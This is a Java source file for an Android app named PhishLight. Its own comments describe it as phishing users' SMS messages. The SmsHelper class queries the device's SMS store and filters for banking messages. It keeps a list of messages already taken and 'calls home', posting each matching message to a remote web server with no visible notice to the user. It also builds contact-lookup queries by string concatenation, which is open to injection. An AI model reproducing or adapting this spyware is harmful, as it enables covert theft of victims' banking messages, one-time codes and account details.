package org.rix1.PhishLight;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.widget.Toast;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.util.ArrayList;
import java.util.List;

/*
 * This class deals with all the phishing of user's sms
 * messages and when they are found passed them to the
 * network class.
 * 
 * Created by Phumlile Sopela on 14/09/2014
 * */

public class SmsHelper extends AsyncTask<Void, Void, Void>{

    private Context context;
    private DataHelper dataHelper;
    private NetworkHelper networkHelper;
    private ArrayList<SmsDetails> messageList;
    private ArrayList<String> foundMessages;

    public SmsHelper(Context c) {
        this.context = c;
        messageList = new ArrayList<SmsDetails>();
        foundMessages = new ArrayList<String>();
        loadList();
    }
    
    // This method helps to load our saved list of already scanned messages

    private void loadList(){
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
        String json = preferences.getString("foundMessages", "");
        Gson gson = new Gson();
        if(!json.equals("")){
            Log.d("APP_SMSHELPER", "List loaded");
            foundMessages = gson.fromJson(json, new TypeToken<List<String>>(){}.getType());
            Log.d("APP_SMSHELPER", "Prev sms list loaded: " + foundMessages.size());
        }
    }

    @Override
    protected Void doInBackground(Void ... ags) {

        postNewSms();

        return null;
    }
    
    // method called when the async task is complete
    protected void onPostExecute(Void result){
        callHome(messageList);
        super.onPostExecute(result);
    }
    
    // method to pass data to the network class to be sent to web server
    public void callHome(ArrayList<SmsDetails> smsList) {
//        Toast.makeText(context, "Calling home...",Toast.LENGTH_SHORT).show();
        Log.d("APP:", "Calling home");
        networkHelper = new NetworkHelper();

        for (SmsDetails sms : smsList){
            networkHelper.makePOSTRequest(dataHelper.getData(sms));
        }

        Log.d("APP:", "Done with for - calling home noww");
        networkHelper.execute();
    }
    
    /*
     * Method to scan sms messages that are in a mobile device
     * and make up a list of all banking messages. 
     * */

    public void postNewSms() {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);

        Log.d("APP_SMSHELPER", "Async Task called postNewSms...");

        String SORT_ORDER = "date DESC";
        int count = 0;
        int successfullSentMessages = 0;

        // Get the lastTime pref to only scan messages we haven't scanned.
        long lastTime = prefs.getLong("lastTime", -1);

        Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms"),
                new String[] { "_id", "address", "date","body", "type" }, "date > " + lastTime, null, SORT_ORDER);

        BankDetails bankHelper = new BankDetails();

        if (cursor != null) {


            try {
                count = cursor.getCount();
                if (count > 0) {

                    cursor.moveToFirst();
                    long newLastTime = cursor.getLong(4);

                    do{
                        Long messageId = cursor.getLong(0);
                        String address = cursor.getString(1);

                        String timestamp = cursor.getString(2);
                        String body = cursor.getString(3);

                        if(!foundMessages.contains(Long.toString(messageId)) && bankHelper.smsHasBankContents(body)) {
                            SmsDetails newSms = new SmsDetails(timestamp, messageId, body, address);

                            if (successfullSentMessages == 0) {
                                dataHelper = new DataHelper(context);
                            }

                            messageList.add(newSms);
                            foundMessages.add(Long.toString(messageId));

                            Log.d("APP_SMSHELPER", "Should call home now");
                            successfullSentMessages++;
                        }

                    }while(cursor.moveToNext());

                    // Update the newest timestamp scanned
                    prefs.edit().putLong("lastTime", newLastTime).commit();

                    Log.d("APP_SMSHELPER", "successfull sms: " + successfullSentMessages + " / " + count + " messageList: " + messageList.size()); // (SmsDetails[])bankSmsArray.toArray(new SmsDetails[bankSmsArray.size()]);
                }
            } finally {
                cursor.close();
            }
        }
        saveList();
    }
    
    // This method saves the list of found message so that the server does not receive duplicates. 

    private void saveList(){
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
        Gson gson = new Gson();
        String json = gson.toJson(foundMessages, new TypeToken<List<String>>(){}.getType());
        preferences.edit().putString("foundMessages", json).commit();
            Log.d("APP_SMSHELPER", "Found sms list stored:\n"+json);
    }

    // This method attempts to get the contact name from a phone number.
    private static String getContactName(Context context, String otherNumber) {
        String where = ContactsContract.CommonDataKinds.Phone.NUMBER + " LIKE '%" + otherNumber + "'";
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, where, null, null);
        String name = "Self";

        if (cursor.getCount() > 0) {
            cursor.moveToFirst();
            name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
        } else {
            // Try without the dashes.
            where = ContactsContract.CommonDataKinds.Phone.NUMBER + " LIKE '%" + otherNumber.replaceAll("-", "").substring(1) + "'";
            cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, where, null, null);

            if (cursor.getCount() > 0) {
                cursor.moveToFirst();
                name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            }
        }
        return name;
    }

    // This method formats the contact number in an attempt to match how it was entered by the user.
    public static String formatNumber(String number){
        String result = "";
        if (number.startsWith("+")){
            result = number.substring(0, 2) + "-" + number.substring(2,5) + "-" +
                    number.substring(5,8) + "-" + number.substring(8);
        } else if (number.startsWith("1")) {
            result = number.substring(0, 1) + "-" + number.substring(1,4) + "-" +
                    number.substring(4,7) + "-" + number.substring(7);
        } else {
            result = number.substring(0, 3) + "-" + number.substring(3,6) + "-" + number.substring(6);
        }
        return result;
    }
}
